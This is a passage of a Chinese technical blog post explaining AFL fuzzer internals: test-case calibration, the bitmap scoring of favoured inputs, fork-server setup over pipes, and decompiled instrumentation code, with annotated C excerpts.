M[&quot;校准测试用例&lt;br/&gt;res = calibrate_case&quot;]</span><br><span class="line">    M --&gt; N[&quot;释放内存&lt;br/&gt;ck_free use_mem&quot;]</span><br><span class="line">    N --&gt; O&#123;stop_soon?&#125;</span><br><span class="line">    O --&gt;|是| P[提前返回]</span><br><span class="line">    O --&gt;|否| Q[&quot;根据结果类型处理&lt;br/&gt;switch res&quot;]</span><br><span class="line">    Q --&gt; R[&quot;FAULT_NONE: 检查覆盖率&quot;]</span><br><span class="line">    Q --&gt; S[&quot;FAULT_TMOUT: 处理超时&quot;]</span><br><span class="line">    Q --&gt; T[&quot;FAULT_CRASH: 处理崩溃&quot;]</span><br><span class="line">    Q --&gt; U[&quot;FAULT_ERROR: 执行错误&quot;]</span><br><span class="line">    Q --&gt; V[&quot;FAULT_NOINST: 无插桩&quot;]</span><br><span class="line">    Q --&gt; W[&quot;FAULT_NOBITS: 无新位&quot;]</span><br><span class="line">    R --&gt; X[检查可变行为]</span><br><span class="line">    S --&gt; Y[增加cal_failures]</span><br><span class="line">    T --&gt; Y</span><br><span class="line">    U --&gt; Z[FATAL 退出]</span><br><span class="line">    V --&gt; Z</span><br><span class="line">    W --&gt; AA[增加useless_at_start]</span><br><span class="line">    X --&gt; BB[&quot;移到下一个测试用例&lt;br/&gt;q = q-&gt;next&quot;]</span><br><span class="line">    Y --&gt; BB</span><br><span class="line">    AA --&gt; BB</span><br><span class="line">    BB --&gt; C</span><br><span class="line">    C --&gt;|否| CC&#123;&quot;有校准失败?&lt;br/&gt;cal_failures &gt; 0&quot;&#125;</span><br><span class="line">    CC --&gt;|是| DD[输出失败统计信息]</span><br><span class="line">    CC --&gt;|否| EE[&quot;输出 All test cases processed&quot;]</span><br><span class="line">    DD --&gt; EE</span><br><span class="line">    EE --&gt; FF[结束]</span><br></pre></td></tr></table></figure><h3 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score"></a>update_bitmap_score</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">update_bitmap_score</span><span class="params">(<span class="keyword">struct</span> queue_entry* q)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line">  u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* For every byte set in trace_bits[], see if there is a previous winner,</span></span><br><span class="line"><span class="comment">     and how it compares to us. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAP_SIZE; i++)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (trace_bits[i]) &#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (top_rated[i]) &#123;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Faster-executing or smaller test cases are favored. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">/* Looks like we&#x27;re going to win. Decrease ref count for the</span></span><br><span class="line"><span class="comment">            previous winner, discard its trace_bits[] if necessary. */</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;</span><br><span class="line">           <span class="built_in">ck_free</span>(top_rated[i]-&gt;trace_mini);</span><br><span class="line">           top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* Insert ourselves as the new winner. */</span></span><br><span class="line"></span><br><span class="line">       top_rated[i] = q;</span><br><span class="line">       q-&gt;tc_ref++;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">         q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);</span><br><span class="line">         <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       score_changed = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数是AFL优化算法的第一阶段，负责为每个覆盖率位置维护一个”最优”测试用例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u64 fav_factor = q-&gt;exec_us * q-&gt;len;</span><br></pre></td></tr></table></figure><p><code>评分因子=执行时间*测试用例文件的大小</code></p><p>评分改变只在以下情况发生：</p><p><strong>新的覆盖率位置：</strong></p><ul><li><p>当 trace_bits[i] !&#x3D; 0 且 top_rated[i] &#x3D;&#x3D; NULL</p></li><li><p>即发现了全新的代码覆盖路径</p></li></ul><p><strong>更优的测试用例：</strong></p><ul><li><p>现有位置有竞争者，但新测试用例表现更好</p></li><li><p><strong>new_fav_factor &lt; old_fav_factor</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fav_factor &gt; top_rated[i]-&gt;exec_us * top_rated[i]-&gt;len) <span class="keyword">continue</span>; <span class="comment">//要求严格优于</span></span><br></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">top_rated[i] = q;  <span class="comment">// 设置新的最优测试用例</span></span><br><span class="line">q-&gt;tc_ref++;       <span class="comment">// 增加引用计数</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!--top_rated[i]-&gt;tc_ref) &#123;</span><br><span class="line">    <span class="built_in">ck_free</span>(top_rated[i]-&gt;trace_mini);</span><br><span class="line">    top_rated[i]-&gt;trace_mini = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>减少旧的用例的引用次数，如果为0（就是bitmap上每一个路径都不是这个旧的用例的最佳用例），就会释放<code>trace_mini</code>，然后标记<code>trace_mini=0</code>，然后</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!q-&gt;trace_mini) &#123;</span><br><span class="line">    q-&gt;trace_mini = <span class="built_in">ck_alloc</span>(MAP_SIZE &gt;&gt; <span class="number">3</span>);  <span class="comment">// 分配8KB</span></span><br><span class="line">    <span class="built_in">minimize_bits</span>(q-&gt;trace_mini, trace_bits); <span class="comment">// 压缩64KB到8KB</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果新的最佳没有trace_mini就会分配一个，然后将64KB的覆盖率信息压缩为8KB的位向量</p><h2 id="init-forkserver"><a href="#init-forkserver" class="headerlink" title="init_forkserver"></a>init_forkserver</h2><p>参数是<code>char **argv</code>指向目标程序的完整路径以及一些参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> s32 forksrv_pid;      <span class="comment">// Fork server进程ID</span></span><br><span class="line"><span class="type">static</span> s32 fsrv_ctl_fd;      <span class="comment">// 控制管道文件描述符(写端)</span></span><br><span class="line"><span class="type">static</span> s32 fsrv_st_fd;       <span class="comment">// 状态管道文件描述符(读端)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORKSRV_FD          198    <span class="comment">// Fork server通信基础文件描述符</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORK_WAIT_MULT      10     <span class="comment">// 握手等待时间倍数</span></span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">itimerval</span> it;</span><br><span class="line"><span class="type">int</span> st_pipe[<span class="number">2</span>], ctl_pipe[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> status;</span><br><span class="line">s32 rlen;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ACTF</span>(<span class="string">&quot;Spinning up the fork server...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">pipe</span>(st_pipe) || <span class="built_in">pipe</span>(ctl_pipe)) <span class="built_in">PFATAL</span>(<span class="string">&quot;pipe() failed&quot;</span>);</span><br></pre></td></tr></table></figure><p>创建两个管道用户进程间的通信</p><ul><li><p>st_pipe: 状态管道，fork server → AFL主进程</p></li><li><p>ctl_pipe: 控制管道，AFL主进程 → fork server</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">forksrv_pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (forksrv_pid &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;fork() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!forksrv_pid) &#123;</span><br><span class="line">    <span class="comment">// 子进程代码 - 将成为fork server</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 父进程代码 - AFL主进程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="子进程"><a href="#子进程" class="headerlink" title="子进程"></a>子进程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rlimit</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">getrlimit</span>(RLIMIT_NOFILE, &amp;r) &amp;&amp; r.rlim_cur &lt; FORKSRV_FD + <span class="number">2</span>) &#123;</span><br><span class="line">    r.rlim_cur = FORKSRV_FD + <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_NOFILE, &amp;r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>确保有足够的文件描述符</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (mem_limit) &#123;</span><br><span class="line">    r.rlim_max = r.rlim_cur = ((<span class="type">rlim_t</span>)mem_limit) &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RLIMIT_AS</span></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_AS, &amp;r);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="built_in">setrlimit</span>(RLIMIT_DATA, &amp;r);  <span class="comment">// OpenBSD</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不同系统使用不同的内存限制类型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.rlim_max = r.rlim_cur = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setrlimit</span>(RLIMIT_CORE, &amp;r);</span><br></pre></td></tr></table></figure><p>核心转储影响性能，且在模糊测试中不需要，因此禁用了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setsid</span>();                        <span class="comment">// 创建新会话，脱离控制终端</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dup2</span>(dev_null_fd, <span class="number">1</span>);           <span class="comment">// stdout → /dev/null</span></span><br><span class="line"><span class="built_in">dup2</span>(dev_null_fd, <span class="number">2</span>);           <span class="comment">// stderr → /dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (out_file) &#123;</span><br><span class="line">    <span class="built_in">dup2</span>(dev_null_fd, <span class="number">0</span>);       <span class="comment">// stdin → /dev/null</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">dup2</span>(out_fd, <span class="number">0</span>);            <span class="comment">// stdin → 测试数据</span></span><br><span class="line">    <span class="built_in">close</span>(out_fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(ctl_pipe[<span class="number">0</span>], FORKSRV_FD) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);        <span class="comment">// 198</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">dup2</span>(st_pipe[<span class="number">1</span>], FORKSRV_FD + <span class="number">1</span>) &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;dup2() failed&quot;</span>);     <span class="comment">// 199</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>将管道映射到固定的文件描述符198和199上</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;LD_BIND_LAZY&quot;</span>)) <span class="built_in">setenv</span>(<span class="string">&quot;LD_BIND_NOW&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>在程序启动时解析所有符号，避免fork后的链接工作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setenv</span>(<span class="string">&quot;ASAN_OPTIONS&quot;</span>, <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;detect_leaks=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;allocator_may_return_null=1&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">setenv</span>(<span class="string">&quot;MSAN_OPTIONS&quot;</span>, <span class="string">&quot;exit_code=&quot;</span> <span class="built_in">STRINGIFY</span>(MSAN_ERROR) <span class="string">&quot;:&quot;</span></span><br><span class="line">                       <span class="string">&quot;symbolize=0:&quot;</span></span><br><span class="line">                       <span class="string">&quot;abort_on_error=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;allocator_may_return_null=1:&quot;</span></span><br><span class="line">                       <span class="string">&quot;msan_track_origins=0&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execv</span>(target_path, argv);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果execv失败</span></span><br><span class="line">*(u32*)trace_bits = EXEC_FAIL_SIG;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>然后就直接执行execv函数</p><p>执行完之后这个新的进程就会替换掉这个子进程，但是文件描述符、PID以及相应的资源限制都会继承</p><p>如果当时是对test程序进行fuzz的话，此时target_path和argv都会指向该程序的绝对路径</p><p>因此这个子进程就会变成一个test进程</p><blockquote><p>execv参数设置：</p><ol><li>path：指向要执行程序的绝对路径，例如：”&#x2F;bin&#x2F;ls”;</li><li>argv：要执行的命令，例如：{“ls”, “-l”, “&#x2F;tmp”, NULL};</li><li>env：执行环境变量的C语言字符串</li></ol></blockquote><h3 id="父进程（AFL主进程）"><a href="#父进程（AFL主进程）" class="headerlink" title="父进程（AFL主进程）"></a>父进程（AFL主进程）</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(ctl_pipe[<span class="number">0</span>]);    <span class="comment">// 关闭控制管道读端</span></span><br><span class="line"><span class="built_in">close</span>(st_pipe[<span class="number">1</span>]);     <span class="comment">// 关闭状态管道写端</span></span><br><span class="line"></span><br><span class="line">fsrv_ctl_fd = ctl_pipe[<span class="number">1</span>];  <span class="comment">// 保存控制管道写端</span></span><br><span class="line">fsrv_st_fd  = st_pipe[<span class="number">0</span>];   <span class="comment">// 保存状态管道读端</span></span><br></pre></td></tr></table></figure><p>设置管道的端点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置超时定时器</span></span><br><span class="line">it.it_value.tv_sec = ((exec_tmout * FORK_WAIT_MULT) / <span class="number">1000</span>);</span><br><span class="line">it.it_value.tv_usec = ((exec_tmout * FORK_WAIT_MULT) % <span class="number">1000</span>) * <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待4字节hello消息</span></span><br><span class="line">rlen = <span class="built_in">read</span>(fsrv_st_fd, &amp;status, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清除定时器</span></span><br><span class="line">it.it_value.tv_sec = <span class="number">0</span>;</span><br><span class="line">it.it_value.tv_usec = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">setitimer</span>(ITIMER_REAL, &amp;it, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>握手等待</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (rlen == <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="built_in">OKF</span>(<span class="string">&quot;All right - fork server is up.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功会这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (child_timed_out)</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;Timeout while initializing fork server (adjusting -t may help)&quot;</span>);</span><br></pre></td></tr></table></figure><p>超时</p><h3 id="执行插桩代码分析"><a href="#执行插桩代码分析" class="headerlink" title="执行插桩代码分析"></a>执行插桩代码分析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_afl_maybe_log(argc, argv, envp, <span class="number">43576LL</span>);</span><br></pre></td></tr></table></figure><p>a4是这个函数的唯一标识符，也可以说是一个时间戳的随机数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall _afl_maybe_log(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// of</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// al</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  __int64 v15; <span class="comment">// [rsp-10h] [rbp-180h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [rsp+10h] [rbp-160h]</span></span><br><span class="line">  __int64 v17; <span class="comment">// [rsp+18h] [rbp-158h]</span></span><br><span class="line"></span><br><span class="line">  v5 = v4;</span><br><span class="line">  v6 = _afl_area_ptr;</span><br><span class="line">  <span class="keyword">if</span> ( !_afl_area_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_setup_failure )</span><br><span class="line">      <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">    v6 = _afl_global_area_ptr;</span><br><span class="line">    <span class="keyword">if</span> ( _afl_global_area_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      _afl_area_ptr = _afl_global_area_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = v4;</span><br><span class="line">      v17 = a4;</span><br><span class="line">      v9 = <span class="built_in">getenv</span>(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v9 || (v10 = <span class="built_in">atoi</span>(v9), v11 = <span class="built_in">shmat</span>(v10, <span class="number">0LL</span>, <span class="number">0</span>), v11 == (<span class="type">void</span> *)<span class="number">-1LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        ++_afl_setup_failure;</span><br><span class="line">        v5 = v16;</span><br><span class="line">        <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      _afl_area_ptr = (__int64)v11;</span><br><span class="line">      _afl_global_area_ptr = v11;</span><br><span class="line">      v15 = (__int64)v11;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>) == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="number">198</span>;</span><br><span class="line">          <span class="keyword">if</span> ( <span class="built_in">read</span>(<span class="number">198</span>, &amp;_afl_temp, <span class="number">4uLL</span>) != <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">LODWORD</span>(v13) = fork();</span><br><span class="line">          <span class="keyword">if</span> ( v13 &lt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            <span class="keyword">goto</span> __afl_fork_resume;</span><br><span class="line">          _afl_fork_pid = v13;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_fork_pid, <span class="number">4uLL</span>);</span><br><span class="line">          v12 = _afl_fork_pid;</span><br><span class="line">          <span class="built_in">LODWORD</span>(v14) = <span class="built_in">waitpid</span>(_afl_fork_pid, &amp;_afl_temp, <span class="number">0</span>);</span><br><span class="line">          <span class="keyword">if</span> ( v14 &lt;= <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">write</span>(<span class="number">199</span>, &amp;_afl_temp, <span class="number">4uLL</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _exit(v12);</span><br><span class="line">      &#125;</span><br><span class="line">__afl_fork_resume:</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">198</span>);</span><br><span class="line">      <span class="built_in">close</span>(<span class="number">199</span>);</span><br><span class="line">      v6 = v15;</span><br><span class="line">      v5 = v16;</span><br><span class="line">      a4 = v17;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = _afl_prev_loc ^ a4;</span><br><span class="line">  _afl_prev_loc ^= v7;</span><br><span class="line">  _afl_prev_loc = (<span class="type">unsigned</span> __int64)_afl_prev_loc &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  ++*(_BYTE *)(v6 + v7);</span><br><span class="line">  <span class="keyword">return</span> v5 + <span class="number">127</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v9 = <span class="built_in">getenv</span>(<span class="string">&quot;__AFL_SHM_ID&quot;</span>);           <span class="comment">// 获取共享内存ID</span></span><br><span class="line">v10 = <span class="built_in">atoi</span>(v9);                       <span class="comment">// 转换为整数</span></span><br><span class="line">v11 = <span class="built_in">shmat</span>(v10, <span class="number">0LL</span>, <span class="number">0</span>);             <span class="comment">// 连接共享内存</span></span><br></pre></td></tr></table></figure><p>连接共享内存</p><h4 id="Forkserver"><a href="#Forkserver" class="headerlink" title="Forkserver"></a>Forkserver</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 